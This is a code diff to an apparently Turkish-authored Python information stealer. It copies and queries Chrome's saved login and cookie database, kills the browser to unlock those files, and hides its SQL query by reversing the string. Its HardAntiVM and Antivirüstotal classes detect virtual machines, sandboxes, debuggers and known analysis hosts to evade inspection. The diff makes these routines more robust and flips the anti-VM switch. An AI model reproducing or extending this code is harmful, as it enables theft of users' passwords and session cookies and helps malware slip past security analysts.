@@ -1,5 +1,5 @@
 import sqlite3, ctypes, mss, sys
-import os, wmi, win32api, platform, uuid, psutil
+import os, wmi, win32api, platform, uuid, psutil, time
 import shutil
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
@@ -178,14 +178,21 @@ class ChromeLoginData:
             if not os.path.isfile(path):
                 return
             else:
-                #print(path)
                 try:
                     ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                 except:
                     ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                 profil_kismi = profil_kismii.replace("_", " ")
                 self.login_data_path = path
-                shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                try:
+                    shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                except:
+                    try:
+                        subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
+                        time.sleep(1.5)
+                        shutil.copy2(self.login_data_path, self.backup_login_data_path)
+                    except:
+                        pass
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
                 query = self.reverseToNormal('seikooc morf ctu_seripxe,eulav_detpyrcne ,htap ,eman ,yek_tsoh tceles')
@@ -819,7 +826,8 @@ class HardAntiVM:
                 return True
         return False
     def check_mac_address(self):
-        mac_addresses = [
+        try:
+            mac_addresses = [
             '00:0C:29',   # VMware
             '00:50:56',   # VMware
             '00:05:69',   # VMware
@@ -832,10 +840,12 @@ class HardAntiVM:
             '00:50:79',   # Oracle VM
             '00:18:51',   # Virtual Iron
             ]
-        for adres in mac_addresses:
-            if self.get_mac_adress().startswith(adres):
-                return True
-        return False
+            for adres in mac_addresses:
+                if self.get_mac_adress().startswith(adres):
+                    return True
+            return False
+        except:
+            return False
     def get_mac_adress(self):
         try:
             node = uuid.getnode()
@@ -844,39 +854,47 @@ class HardAntiVM:
         except:
             pass
     def check_hostname(self):
-        hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
-        hostname = platform.node().lower()
-        for name in hostNames:
-            if name in hostname:
-                return True
-        return False
+        try:
+            hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
+            hostname = platform.node().lower()
+            for name in hostNames:
+                if name in hostname:
+                    return True
+            return False
+        except:
+            return False
     def check_processes(self):
-        banned_processes = [
-        "vmtoolsd.exe",     # VMware
-        "vmwaretray.exe",   # VMware
-        "vmacthlp.exe",     # VMware
-        "vboxtray.exe",     # VirtualBox
-        "vboxservice.exe",  # VirtualBox
-        "vmsrvc.exe",       # VirtualBox
-        "prl_tools.exe",    # Parallels
-        "xenservice.exe",   # Xen
-    ]
-    
-        for process in psutil.process_iter(['name']):
-            if process.info['name'].lower() in banned_processes:
-                return True
-        return False
+        try:
+            banned_processes = [
+            "vmtoolsd.exe",     # VMware
+            "vmwaretray.exe",   # VMware
+            "vmacthlp.exe",     # VMware
+            "vboxtray.exe",     # VirtualBox
+            "vboxservice.exe",  # VirtualBox
+            "vmsrvc.exe",       # VirtualBox
+            "prl_tools.exe",    # Parallels
+            "xenservice.exe",   # Xen
+                            ]           
+            for process in psutil.process_iter(['name']):
+                if process.info['name'].lower() in banned_processes:
+                    return True
+            return False
+        except:
+            return False
     def check_files(self):
-        banned_files = [
-        "\\Device\\Harddisk0\\DR0",     # VMware
-        "\\Device\\Harddisk0\\DR1",     # VirtualBox
-        "\\Device\\Harddisk0\\DR2",     # Parallels
-        "\\Device\\Harddisk0\\DR3",     # Xen
-        ]      
-        for file in banned_files:
-            if os.path.exists(file):
-                return True
-        return False 
+        try:
+            banned_files = [
+                "\\Device\\Harddisk0\\DR0",     # VMware
+                "\\Device\\Harddisk0\\DR1",     # VirtualBox
+                "\\Device\\Harddisk0\\DR2",     # Parallels
+                "\\Device\\Harddisk0\\DR3",     # Xen
+                ]      
+            for file in banned_files:
+                if os.path.exists(file):
+                    return True
+            return False 
+        except:
+            return False
     def check_gdb(self):
         try:
             output = subprocess.check_output(["gdb", "--version"], stderr=subprocess.STDOUT, timeout=5)
@@ -886,15 +904,21 @@ class HardAntiVM:
             pass
         return False
     def check_debugger(self):
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            return True
-        return False
+        try:
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                return True
+            return False
+        except:
+            return False
     def check_cursor_position(self):
-        x, y = win32api.GetCursorPos()
-        if x == 0 and y == 0:
-            return True
-        
-        return False
+        try:
+            x, y = win32api.GetCursorPos()
+            if x == 0 and y == 0:
+                return True
+            
+            return False
+        except:
+            return False
     def check_hypervisor(self):
         try:
             output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT)
@@ -909,18 +933,21 @@ class HardAntiVM:
         except:
             return False
     def normalVM(self):
-        banned_bios_manufacturers = [
-        "VMware",
-        "VirtualBox",
-        "Xen",
-    ]
-        bios_manufacturer = self.get_bios_manufacturer()
-        if bios_manufacturer:
-            for manufacturer in banned_bios_manufacturers:
-                if manufacturer.lower() in bios_manufacturer.lower():
-                    return True
+        try:
+            banned_bios_manufacturers = [
+                "VMware",
+                "VirtualBox",
+                "Xen",
+            ]
+            bios_manufacturer = self.get_bios_manufacturer()
+            if bios_manufacturer:
+                for manufacturer in banned_bios_manufacturers:
+                    if manufacturer.lower() in bios_manufacturer.lower():
+                        return True
 
-        return False
+            return False
+        except:
+            return False
     def get_bios_manufacturer(self):
         try:
             c = wmi.WMI()
@@ -931,18 +958,20 @@ class HardAntiVM:
     def sandboxie(self):
         try:
             handle = ctypes.windll.LoadLibrary("SbieDll.dll")
-            return False
         except:
-            pass
+            return False
         else:
             return True
     def vmcik(self):
-        objWmi = wmi.WMI()
-        for diskDrive in objWmi.query("Select * from Win32_DiskDrive"):
-            if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
-                return True
-            else:
-                return False   
+        try:
+            objWmi = wmi.WMI()
+            for diskDrive in objWmi.query("Select * from Win32_DiskDrive"):
+                if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
+                    return True
+                else:
+                    return False   
+        except:
+            return False
 
 class Antivirüstotal:
     def __init__(self) -> None:
@@ -962,13 +991,11 @@ class Antivirüstotal:
             if os.getenv('computername') in compnames:
                 sys.exit(0)
             else:
-                continue
-    
-                        
+                continue           
 
 if __name__ == "__main__":
     Antivirüstotal()
-    if Anti_Vm == "true":
+    if Anti_Vm == "false":
         thread = threading.Thread(target=ChromeLoginData,daemon=True)
         thread.start()
         thread.join()
